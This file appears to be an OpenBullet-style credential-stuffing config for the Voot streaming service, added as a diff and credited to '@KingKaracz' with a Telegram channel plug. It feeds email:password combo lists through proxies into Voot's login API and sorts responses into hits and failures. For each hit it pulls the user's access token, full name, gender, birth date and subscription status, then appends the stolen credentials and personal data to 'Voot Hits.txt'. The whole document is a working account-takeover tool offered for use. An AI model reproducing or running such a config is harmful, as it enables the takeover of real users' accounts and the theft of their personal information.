@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "Voot",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-03T17:04:52.0646706+02:00",
+  "AdditionalInfo": "t.me/KaraczTM",
+  "Author": "@KingKaracz",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Don't Forget To Check Telegram Channel | @KaraczTM",
+      "VariableName": "Don't Forget To Check Telegram Channel | @KaraczTM",
+      "Id": 441271683
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://us-central1-vootdev-stg.cloudfunctions.net/usersV3/v3/login" 
+  CONTENT "{\"type\":\"traditional\",\"deviceId\":\"Windows NT 10.0\",\"deviceBrand\":\"PC/MAC\",\"data\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: us-central1-vootdev-stg.cloudfunctions.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Origin: https://voting.voot.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://voting.voot.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email is not allowed to be empty" 
+    KEY "User does not exist" 
+    KEY "That’s an incorrect password. Please try again" 
+    KEY "Email must be a valid email" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+#tk PARSE "<SOURCE>" JSON "accessToken" -> VAR "tk" 
+
+#Full_Name PARSE "<SOURCE>" JSON "fullName" CreateEmpty=FALSE -> CAP "Full Name" 
+
+#GR PARSE "<SOURCE>" JSON "gender" -> VAR "GR" 
+
+#Gender FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "M" VALUE "Male" 
+  KEY "F" VALUE "Female" 
+  KEY "m" VALUE "Male" 
+  KEY "f" VALUE "Female" 
+  "<GR>" -> CAP "Gender" 
+
+#Birth_Date PARSE "<SOURCE>" JSON "birthDate" CreateEmpty=FALSE -> CAP "Birth Date" 
+
+#Info REQUEST GET "https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status" 
+  
+  HEADER "accesstoken: <tk>" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "status\":\"inactive" 
+    KEY "status\":\"free" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "status\":\"expired" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"active" 
+
+#Plan FUNCTION Constant "Premium" -> CAP "Plan" 
+
+#Expiry PARSE "<SOURCE>" JSON "gmtDate" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#Credit FUNCTION Constant "@KingKaracz" -> CAP "Config By" 
+
+UTILITY File "Voot Hits.txt" AppendLines "Combo : <USER>:<PASS> | Mail : <USER> | Pass : <PASS> | Full Name : <Full Name> | Gender : <Gender> | Birth Date : <Birth Date> | Plan : <Plan> | Expiry : <Expiry> | Config By : @KingKaracz" 
+
